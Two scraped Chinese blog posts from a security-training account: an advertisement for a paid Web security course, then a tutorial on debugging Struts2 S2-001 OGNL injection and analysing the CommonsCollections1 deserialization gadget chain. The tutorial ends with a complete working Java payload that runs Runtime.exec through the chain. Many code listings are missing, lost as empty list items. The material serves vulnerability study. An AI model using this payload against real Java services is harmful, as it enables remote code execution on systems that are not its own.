➜缺人！数百家企业，年薪20W-60W招募Web安全新人…|最后2天！
http://www.sohu.com/a/419255596_99907709	23955
<p><span style="font-size: 16px;">最近，有不少小伙伴想要转行网络安全，Web安全成了很多人的首选，但也有不少人还在犹豫，我们在公众号后台收到了不少人的留言： </span></p>
<p><span><span style="font-size: 16px;"></span><span style="font-size: 16px;">合天智汇近年来开展的就业推荐服务，为上百家知名企业提供了人才推荐，与企业接触之后最深的感触是：</span><span><strong><span style="font-size: 16px;">缺人，缺做Web安全的人</span></strong></span><strong><span style="font-size: 16px;">。</span></strong></span></p>
<p><span style="font-size: 16px;">尤其是近2年企业对Web安全类人才的需求越发明显。</span></p>
<p><span><span style="font-size: 16px;">今年在国内</span><span style="font-size: 16px;">至少有数百家企业，有能力且愿意， <span style="font-size: 16px;">年薪20万-60万</span>，招募各类Web安全人才。 </span></span></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200918/bf1176cbb3fe49779d5ac45a14530ce9.png" /></p>
<p><span style="font-size: 16px;">（图片来源：boss直聘） </span></p>
<p><img src="http://p1.itc.cn/q_70/images03/20200918/ad8047e3c58840609c38f405d18edd8d.png" /></p>
<p><strong><span style="font-size: 16px;"><span style="font-size: 16px;">（图片来源：boss直聘）</span></span></strong></p>
<p><strong>Web安全人才缺口，将会持续很多年。甚至，随着互联网的不断扩大，企业对网络安全的认知升级，这个缺口，必定将继续扩大。 </strong></p>
<p><span style="font-size: 16px;">我们就经常会收到各个企业发来的定向“挖人”需求，定向招聘Web安全人才。 </span></p>            <div class="lookall-box">
<div class="lookall-shadow"></div>
<section class="lookall">
<a href="javascript:;" class="show-all" id="showMore">
<em>展开全文</em>
</a>
</section>
</div>
<div class="hidden-content control-hide">
<p style="text-align: center;"><img src="http://p7.itc.cn/q_70/images03/20200918/c6a9e75e0aee4906b2998a7ccc373e90.png" /></p>
<p><span style="font-size: 16px;">Web安全的就业前景很大，入门门槛也相对较低，只要你认真学习和实操，有个精通Web安全的老师带你， <span>大部分都能飞速成长</span>。所以， </span></p>
<p><span style="font-size: 16px;">如果你也是一名想进入Web安全行业，急需专业老师带路的人； </span></p>
<p>当然还包括急需提升实战技能，想找一份心仪工作的0-3年Web安全新人； </p>
<p>以及在校大学生，想进入Web安全行业，急需参与实操项目的同学。 </p>
<p><span style="font-size: 16px;">我们真心推荐这堂《Web安全0基础入门到精通》课程，它将带你高效入门Web安全，并帮助你快速找到心仪的工作，这门课开班2期以来，得到了学员们100%好评，以下为部分学员反馈。</span></p>
<p><img src="http://p7.itc.cn/q_70/images03/20200918/feae29a003f64b6f85ffc76cd49b7056.png" /></p>
<p><img src="http://p8.itc.cn/q_70/images03/20200918/a963833db12c4a9eafc676ca28090f9b.png" /></p>
<p><img src="http://p1.itc.cn/q_70/images03/20200918/49c924a894ab4f868c2161cf46c77465.png" /></p>
<p><img src="http://p8.itc.cn/q_70/images03/20200918/70fcdf0210a74533af66cdc02d4c0c0c.png" /></p>
<p><img src="http://p9.itc.cn/q_70/images03/20200918/0d6b993b8f244e0497308e5ff4c5f737.jpeg" /></p>
<p><img src="http://p0.itc.cn/q_70/images03/20200918/797f1facfcbd4605a4b268a53550a920.png" /></p>
<p><span style="font-size: 16px;">左右滑动查看更多</span></p>
<p><span style="font-size: 16px;">优惠倒计时2天，现在报名可享受早鸟价</span><span style="font-size: 16px;">4420</span><span style="font-size: 16px;">元。</span></p>
<p><span style="font-size: 16px;"><strong><span style="font-size: 16px;">接下来，不妨为你介绍这门课程凭什么可以帮你转行/入门</span></strong><strong><span style="font-size: 16px;">Web安全</span></strong><strong><span style="font-size: 16px;">，并找到一份靠谱的好工作！</span></strong></span></p>
<p style="text-align: center;"><img src="http://p8.itc.cn/q_70/images03/20200918/3df5deb8eb904a75bf8870f0d12c7895.jpeg" /></p>
<p>戳 <span>“阅读原文”</span>抢购课程 </p>
➜Java-Web之s2-001与CommonsCollections
http://www.sohu.com/a/419379784_99907709	23955
<p><img src="http://p0.itc.cn/q_70/images03/20200919/d5176a7dea5f4c1bb64714f25ee57c76.gif" /></p>
<p style="text-align: center;"><span style="font-size: 20px;"><strong>9/18</strong></span></p>
<p style="text-align: center;"><span style="font-size: 16px;">文章共计5667个词</span></p>
<p style="text-align: center;"><span style="font-size: 16px;">预计阅读10分钟</span></p>
<p style="text-align: center;"><span style="font-size: 16px;">纪念918 勿忘国耻 警钟长鸣</span></p>
<p><span>本文源自我个人入坑Java-Web安全的一点小经验，献给那些看得懂java代码但不知道从哪里入手代审的师傅们：）</span></p>
<p><span style="font-size: 16px;">Struts2之s2-001</span><span style="font-size: 16px;">环境配置</span></p>
<p><span style="font-size: 16px;">说说环境配置的问题，大多数人对漏洞复现的恐惧感还是来自于环境的配置，也许配了大半天的环境后只花几分钟就把漏洞复现了，感觉有点得不偿失，环境配置过程又是因各人电脑问题有着五花八门的问题，因此有时候会找不到问题出在哪。</span></p>
<p><span style="font-size: 16px;">虽说有现成的vulhub，但有些没有被收录在内的洞我们想复现时就需要自己搭环境了；并且有个好处就是我们可以下断点慢慢试分析漏洞的原理而不是只会用poc。</span></p>
<p><span style="font-size: 16px;">需要列表：</span></p>
<ul>
<li>jdk1.8</li>
<li>tomcat</li>
<li>Struts2</li>
<li>idea</li>
</ul>
<p><span style="font-size: 16px;">一：jdk</span></p>
<p><span style="font-size: 16px;">最好就是用1.8，高低版本可能都会各种水土不服的情况（除了漏洞版本就是需要高低版本的条件）。</span></p>
<p><span style="font-size: 16px;">二：tomcat</span></p>
<p><span style="font-size: 16px;">tomcat配置其实很简单，笔者这里使用的是macos环境，直接上官网找对应版本即可，除非tomcat漏洞，否则通常来说哪个版本应该都是可以的。</span></p>
<p><span style="font-size: 16px;">下载下来后到bin目录下两行命令启动：</span></p>
<p><span>chmod +x *.sh</span></p>            <div class="lookall-box">
<div class="lookall-shadow"></div>
<section class="lookall">
<a href="javascript:;" class="show-all" id="showMore">
<em>展开全文</em>
</a>
</section>
</div>
<div class="hidden-content control-hide">
<p><span>./startup.sh</span></p>
<p><span style="font-size: 16px;">关闭则是运行：</span></p>
<p><span>./shutdown.sh</span></p>
<p><span style="font-size: 16px;">启动后默认在本机8080端口会启动一个服务，访问后得到该页面表示成功：</span></p>
<p><img src="http://p8.itc.cn/q_70/images03/20200919/e8e61d79284e4468ac61e2d3462fa368.png" /></p>
<p><span style="font-size: 16px;">三：ide</span></p>
<p><span style="font-size: 16px;">我选择idea，下面讲讲idea配置tomcat。</span></p>
<p><span style="font-size: 16px;">找到偏好设置之后搜索server，如下图找到application servers，选择+号新增一个tomcat服务器。</span></p>
<p><img src="http://p8.itc.cn/q_70/images03/20200919/6c28b4a2b4f34993b80a1e8b6b41fd96.png" /></p>
<p><span style="font-size: 16px;">在弹出的页面中的tomcat home路径选择为bin的上级路径也就是我们tomcat的根目录即可。</span></p>
<p><span style="font-size: 16px;">四：struts2</span></p>
<p><span style="font-size: 16px;">我这里选择使用vulhub内的war包进行部署，说说war包部署的方法。</span></p>
<p><span style="font-size: 16px;">通常war包我们只需要复制到tomcat的webapps下启动tomcat就会自动解包，我们这里可以把war包解压之后用idea打开该项目，之后add configurations添加一个tomcat服务器，如下：</span></p>
<p><img src="//p5.itc.cn/q_70/images03/20200919/958e9d173c4e4f0ea48a31b5759151d2.png" /></p>
<p><span style="font-size: 16px;">然后在deployment选项下把我们项目添加进去即可开启我们愉快的debug了。</span></p>
<p><span style="font-size: 16px;">我们把lib里面的jar包都选择add to library，然后随意点进去一个类如果maven能够找到源码即可直接download，否则我们就需要自己下载源码然后点击choose source选择源码。</span></p>
<p><span style="font-size: 16px;">利用</span></p>
<p><span style="font-size: 16px;">在分析前我们看看poc：</span></p>
<ul>
<li></li>
</ul>
<p><span style="font-size: 16px;">我们在输入后会显示出结果为：</span></p>
<ul>
<li></li>
</ul>
<p><span style="font-size: 16px;">最简单的poc：</span></p>
<p><span>%{1+1}</span></p>
<p><span style="font-size: 16px;">输出2.</span></p>
<p><span style="font-size: 16px;">分析</span></p>
<p><span style="font-size: 16px;">先从漏洞原理分析以便于我们的断点：</span></p>
<blockquote>
<p><span style="font-size: 16px;">该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</span></p>
<p><span style="font-size: 16px;">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</span></p>
</blockquote>
<p><span style="font-size: 16px;">该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</span></p>
<p><span style="font-size: 16px;">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</span></p>
<p><span style="font-size: 16px;">我们运行项目会发现是一个登陆框，并且结合介绍我们就能够知道可以在如下图处下断点：</span></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200919/7439264d41aa460c82e3044f92a0f117.png" /></p>
<p><span style="font-size: 16px;">我们知道输入后一旦经过漏洞处，那么我们的页面就会有回显，最好的办法就是一直盯着页面一边debug，我习惯是用f8看，一旦运行到了对应的代码页面就会有回显，此时就在该位置下一个断点，然后下次就继续从断点处用f7进入。</span></p>
<p><span style="font-size: 16px;">一整套下来要花不少时间，漏洞比较久了，网上的文章分析够多了，因此我们直接看到：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) {</span><span>// deal with the "pure" expressions first!</span><span>//expression = expression.trim;</span><span>Object result = expression;</span><span></span></p>
<p><span>while (true) {</span><span>int start = expression.indexOf(open + "{");</span><span>int length = expression.length;</span><span>int x = start + 2;</span><span>int end;</span><span>char c;</span><span>int count = 1;</span><span>while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) {</span><span>c = expression.charAt(x++);</span><span>if (c == '{') {</span><span>count++;</span><span>} else if (c == '}') {</span><span>count--;</span><span>}</span><span>}</span><span>end = x - 1;</span><span></span></p>
<p><span>if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) {</span><span>String var = expression.substring(start + 2, end);</span><span></span></p>
<p><span>Object o = stack.findValue(var, asType);</span><span>if (evaluator != null) {</span><span>o = evaluator.evaluate(o);</span><span>}</span><span></span></p>
<p><span>String left = expression.substring(0, start);</span><span>String right = expression.substring(end + 1);</span><span>if (o != null) {</span><span>if (TextUtils.stringSet(left)) {</span><span>result = left + o;</span><span>} else {</span><span>result = o;</span><span>}</span><span></span></p>
<p><span>if (TextUtils.stringSet(right)) {</span><span>result = result + right;</span><span>}</span><span></span></p>
<p><span>expression = left + o + right;</span><span>} else {</span><span>// the variable doesn't exist, so don't display anything</span><span>result = left + right;</span><span>expression = left + right;</span><span>}</span><span>} else {</span><span>break;</span><span>}</span><span>}</span><span></span></p>
<p><span>return XWorkConverter.getInstance.convertValue(stack.getContext, result, asType);</span><span>}</span></p>
<p><span style="font-size: 16px;">在这里下个断点，看看调试后的结果：</span></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200919/389270e987dc4483942d145bf26dff99.png" /></p>
<p><span style="font-size: 16px;">这是调试到某个循环时出现的结果，那么我们继续调试，直接这里慢慢f8，再一次循环后会发现我们外面的花括号去掉了：</span></p>
<p><img src="http://p1.itc.cn/q_70/images03/20200919/088379e38a364f76be729c0d66260e43.png" /></p>
<p><span style="font-size: 16px;">我们会发现其流程是这样的：</span></p>
<ul>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">我们在表单中输入的password字段会先生成为 %{password} ，然后再解析该表达式得到我们输入的值，也就是说他在解析完password后得到的值为： </span></p>
<ul>
<li></li>
</ul>
<p><span style="font-size: 16px;">但此时并没有停止解析，而是递归的解析了我们恶意的ognl表达式，此时我们将得到：</span></p>
<ul>
<li></li>
</ul>
<p><span style="font-size: 16px;">此时就达成了代码执行。 </span></p>
<p><span style="font-size: 16px;">Apache Commons Collections1</span></p>
<p><span style="font-size: 16px;">前面通过s2-001对idea代审有一个初步了解，现在审审热门的Apache Commons Collections，我这里审的是yso的链1。</span></p>
<p><span style="font-size: 16px;">yso指的是：ysoserial <span style="font-size: 16px;">https://github.com/frohoff/ysoserial</span></span></p>
<p><span style="font-size: 16px;">环境配置</span></p>
<p><span style="font-size: 16px;">具体的不多说，关于java反序列化的知识p神有专门的一系列java漫谈，我这里就再叨叨一下环境。</span></p>
<p><span style="font-size: 16px;">我们把项目从github上clone下来后，idea打开我们选中项目里面的pom.xml</span></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200919/c6dc9ba8565d4927a2ade90fd97f3bef.png" /></p>
<p><span style="font-size: 16px;">此时应该是会自动maven导包的，然后我们可以在idea里面选择pom.xml右键如下图下载源码：</span></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200919/0793973c7f0941af93b140f23b44d507.png" /></p>
<p><span style="font-size: 16px;">我们单独测试payload时可以直接运行payload，其默认为calc.exe，那么我在macos上因为计算器的路径不同，就需要修改一下：</span></p>
<p><img src="http://p2.itc.cn/q_70/images03/20200919/37522ed96ad14fca965532d20324def0.png" /></p>
<p><img src="http://p6.itc.cn/q_70/images03/20200919/84ace94624bb4828a26f2e51411690ac.png" /></p>
<p><span style="font-size: 16px;">我本地用的jdk版本时1.8u66，（链1在8u71后就会触发失败了），那么我们再运行就可以成功弹出计算器了，那么我们就开始分析这条链。</span></p>
<p><span style="font-size: 16px;">分析</span></p>
<p><span style="font-size: 16px;">给出的链整体是如下图：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>Requires:</span><span>commons-collections</span><span>*/</span></p>
<p><span style="font-size: 16px;">链是从readObject开始的，并且可以看到这条链出现了大量的transform，先讲讲这是什么。</span></p>
<p><span style="font-size: 16px;">transform方法是Transformer接口所定义的是将输入转为输出的一个方法，通常该Gadget都是主要围绕着ConstantTransformer、InvokerTransformer、ChainedTransformer等Transformer的实现类。</span></p>
<p><span style="font-size: 16px;">因为有具体的链，所以我个人觉得从后往前讲比较容易把整条链串起来，先对代码一块一块拆开分析一下。</span></p>
<p><span style="font-size: 16px;">先看看这部分：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">这一部分都是先前说过的Transformer实现类，可以看到 ChainedTransformer 的会先被调用，而 ChainedTransformer 的transform方法如下： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">iTransformers是一个Transformer类数组，看得出来这个transform的作用就是调用该数组内的每个对象的transform，并且将上一个调用transform的结果作为下一个调用transform方法的参数，以此来达成链式调用的形式，而我们的iTransformers则是 ChainedTransformer 的构造器的一个参数： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
<p>这意味着我们是能够控制这个参数，漏洞利用的最需要的就是参数可控，这里就满足了，继续看会发现有一个 ConstantTransformer 以及三个 InvokerTransformer 是处于同一级别的，从payload可以看出来他们被放在了前面说的参数可控的数组内： </p>
<p><img src="http://p8.itc.cn/q_70/images03/20200919/cc1b96d7b8064713b75c9d83a01e8484.png" /></p>
<p><span style="font-size: 16px;">这里的最后一个 ConstantTransformer 是可以去掉的（这里估计p神的说法是为了隐蔽了启动进程的日志特征，不必过分纠结），因为我们的链只到第三个invoke就完事了，exec大家都很眼熟了，先看看第一个实现类的transform方法有什么用： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">看看transform，其实是去return我们传入的 Runtime.class 了。 </span></p>
<p><span style="font-size: 16px;">下面的关键就是 InvokerTransformer ，来看看其transform方法： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>} catch (NoSuchMethodException ex) {</span><span>throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass + "' does not exist");</span><span>} catch (IllegalAccessException ex) {</span><span>throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass + "' cannot be accessed");</span><span>} catch (InvocationTargetException ex) {</span><span>throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass + "' threw an exception", ex);</span><span>}</span><span>}</span></p>
<p>可以见得关键在三行代码： </p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>//实际的值</span><span>Class cls = input.getClass;</span><span>Method method = cls.getMethod('getMethod', new Class[] {</span><span>String.class, Class[].class });</span><span>return method.invoke(Runtime.class, new Object[] {</span><span>"getRuntime", new Class[0] });</span></p>
<p><span style="font-size: 16px;">我们要的只是return的值，对比一下会发现input为上一次被调用的transform方法的返回值， iMethodName , iParamTypes 以及 iArgs 为我们在调用构造函数时传入的值，这里可能看起来有点绕，先了解一下invoke吧： </span></p>
<p><span style="font-size: 16px;">对于invoke，若方法为静态方法，则传入的为class类；否则为类对象，上面的 getRuntime 便是静态方法。 </span></p>
<p><span style="font-size: 16px;">看得出来这里是先从 Runtime.class ，的getmethod中获取到getmethod，然后从getmethod中调用invoke，因为getRuntime无参数，所以传入一个`new Class[0]，后续的链也是同样的分析方式，重点需要理解清楚反射到底是什么意思。 </span></p>
<p><span style="font-size: 16px;">这里给一个反射的payload对照一下：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">整理一下目前的链为：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">然后继续回看刚刚没看完的链：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">LazyMap.get ，直接上源码看起来就很容易懂的了： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>public static Map decorate(Map map, Transformer factory) {</span><span>return new LazyMap(map, factory);</span><span>}</span><span></span></p>
<p><span>public Object get(Object key) {</span><span>// create value for key if key is not currently in the map</span><span>if (map.containsKey(key) == false) {</span><span>Object value = factory.transform(key);</span><span>map.put(key, value);</span><span>return value;</span><span>}</span><span>return map.get(key);</span><span>}</span></p>
<p>很明显的看到了transform，key可控，那么我们前面的ChainedTransformer利用条件的transform就有了。 </p>
<p><span style="font-size: 16px;">然而这里的构造器是protected的，但注意到有一个decorate方法（是一种设计模式，看名字应该是装饰模式，没有具体了解）。</span></p>
<p><span style="font-size: 16px;">那么到这里我们的payload就增加为：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span style="font-size: 16px;">感兴趣的读者可以试试现在是不是可以弹出计算器了，然而这里又产生了一个问题，怎么调用map的get方法（笔者这上面的payload是手动动调用了get方法），强悍的yso作者找到了 AnnotationInvocationHandler 类，仔细看看这块代码做了什么： </span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p>他重写了readObject方法，然而会发现这里并没有链里面的invoke，事实上这里是使用了动态代理： </p>
<blockquote>
<p><span style="font-size: 16px;">jdk为我们的生成了一个叫$Proxy0（这个名字后面的0是编号，有多个代理类会一次递增）的代理类，这个类文件时放在内存中的，我们在创建代理对象时，就是通过反射获得这个类的构造方法，然后创建的代理实例。通过对这个生成的代理类源码的查看，我们很容易能看出，动态代理实现的具体过程。</span></p>
<p><span style="font-size: 16px;">我们可以对InvocationHandler看做一个中介类，中介类持有一个被代理对象，在invoke方法中调用了被代理对象的相应方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。</span></p>
<p><span style="font-size: 16px;"><strong>代理类调用自己方法时 </strong>，通过自身持有的中介类对象来 <strong>调用中介类对象的invoke方法 </strong>，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。 </span></p>
</blockquote>
<p><span style="font-size: 16px;">jdk为我们的生成了一个叫$Proxy0（这个名字后面的0是编号，有多个代理类会一次递增）的代理类，这个类文件时放在内存中的，我们在创建代理对象时，就是通过反射获得这个类的构造方法，然后创建的代理实例。通过对这个生成的代理类源码的查看，我们很容易能看出，动态代理实现的具体过程。</span></p>
<p><span style="font-size: 16px;">我们可以对InvocationHandler看做一个中介类，中介类持有一个被代理对象，在invoke方法中调用了被代理对象的相应方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。</span></p>
<p><span style="font-size: 16px;"><strong>代理类调用自己方法时 </strong>，通过自身持有的中介类对象来 <strong>调用中介类对象的invoke方法 </strong>，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。 </span></p>
<p><span style="font-size: 16px;">也就是说， AnnotationInvocationHandler 是一个中介类，我们调用了 this.memberValues.entrySet 的时候会调用中介类的invoke方法，而调用时会先调用重写的方法，看起来很复杂，事实上可以理解为php里面的 __call 方法。 </span></p>
<p><span style="font-size: 16px;">看看中介类的invoke：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap) {</span><span>Class[] arrayOfClass = paramClass.getInterfaces;</span><span>if (!paramClass.isAnnotation || arrayOfClass.length != 1 || arrayOfClass[false] != Annotation.class)</span><span>throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type."); </span><span>this.type = paramClass;</span><span>this.memberValues = paramMap;</span><span>}</span><span>public Object invoke(Object paramObject, Method paramMethod, Object[] paramArrayOfObject) {</span><span>······</span><span></span></p>
<p><span>Object object = this.memberValues.get(str); //调用了get方法</span><span>if (object == null)</span><span>throw new IncompleteAnnotationException(this.type, str); </span><span>if (object instanceof ExceptionProxy)</span><span>throw ((ExceptionProxy)object).generateException; </span><span>if (object.getClass.isArray &amp;&amp; Array.getLength(object) != 0)</span><span>object = cloneArray(object); </span><span>return object;</span><span>}</span></p>
<p>梳理一下从上往下看就是调用 AnnotationInvocationHandler 的 readObject 方法时会调用到 memberValues 也就是代理类的 entrySet ，然后就会去调用中介类的invoke方法，invoke方法里面又会去调用 memberValues 的get方法，此时就与前面的map需要get连上来了。 </p>
<p><span style="font-size: 16px;">这里给一下反射类的非公有构造器的方法：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p>这里的 setAccessible 是设置作用域，补充这一点是因为 AnnotationInvocationHandler 的构造器就是非公有的。 </p>
<p><span style="font-size: 16px;">改写一下payload：</span></p>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
<p><span>import org.apache.commons.collections.Transformer;</span><span>import org.apache.commons.collections.functors.ChainedTransformer;</span><span>import org.apache.commons.collections.functors.ConstantTransformer;</span><span>import org.apache.commons.collections.functors.InvokerTransformer;</span><span>import org.apache.commons.collections.map.LazyMap;</span><span>import ysoserial.payloads.CommonsCollections1;</span><span>import ysoserial.payloads.util.Gadgets;</span><span>import ysoserial.payloads.util.PayloadRunner;</span><span>import ysoserial.payloads.util.Reflections;</span><span></span></p>
<p><span>import java.io.*;</span><span>import java.lang.annotation.Retention;</span><span>import java.lang.reflect.Constructor;</span><span>import java.lang.reflect.InvocationHandler;</span><span></span></p>
<p><span>import java.lang.reflect.Proxy;</span><span>import java.util.HashMap;</span><span>import java.util.Map;</span><span></span></p>
<p><span>public class InTest {</span><span>public static void main(String[] args) throws Exception {</span><span>Transformer[] transformers = new Transformer[]{</span><span>new ConstantTransformer(Runtime.class),</span><span>new InvokerTransformer("getMethod", new Class[] {</span><span>String.class, Class[].class }, new Object[] {</span><span>"getRuntime", new Class[0] }),</span><span>new InvokerTransformer("invoke", new Class[] {</span><span>Object.class, Object[].class }, new Object[] {</span><span>null, new Object[0] }),</span><span>new InvokerTransformer("exec",</span><span>new Class[] { String.class }, new String[] { "calc" })</span><span>};</span><span>Transformer transformerChain = new ChainedTransformer(transformers);</span><span>Map map = new HashMap;</span><span>Map lazyMap = LazyMap.decorate(map, transformerChain);</span><span></span></p>
<p><span>Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span><span>Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><span>construct.setAccessible(true);</span><span>InvocationHandler handler = (InvocationHandler) construct.newInstance(Override.class, lazyMap);</span><span>Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader, new Class[] {Map.class}, handler);</span><span>handler = (InvocationHandler) construct.newInstance(Override.class, proxyMap);</span><span></span></p>
<p><span>ByteArrayOutputStream barr = new ByteArrayOutputStream;</span><span>ObjectOutputStream oos = new ObjectOutputStream(barr);</span><span>oos.writeObject(handler);</span><span>oos.close;</span><span>System.out.println(barr);</span><span>ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray));</span><span>Object o = (Object)ois.readObject;</span><span>}</span><span>}</span></p>
<p><span style="font-size: 16px;">小结</span></p>
<p><span style="font-size: 16px;">不得不感叹能挖掘出这些漏洞的都是人才，没啥话好说了，只能说一句牛逼。</span></p>
<p><span style="font-size: 16px;">参考</span></p>
<p><span style="font-size: 16px;">https://xz.aliyun.com/t/7915</span></p>
<p><span style="font-size: 16px;">p神java安全漫谈</span></p>
<p><span style="font-size: 16px;">实验推荐</span></p>
<p><span style="font-size: 16px;">Java反序列漏洞 </span></p>
<p><span style="font-size: 16px;">本实验通过Apache Commons Collections 3为例，分析并复现JAVA反序列化漏洞。</span></p>
<p style="text-align: center;"><span style="font-size: 20px;"><strong>9/18</strong></span></p>
<p><span style="font-size: 16px;">勿忘国耻 警钟长鸣</span></p>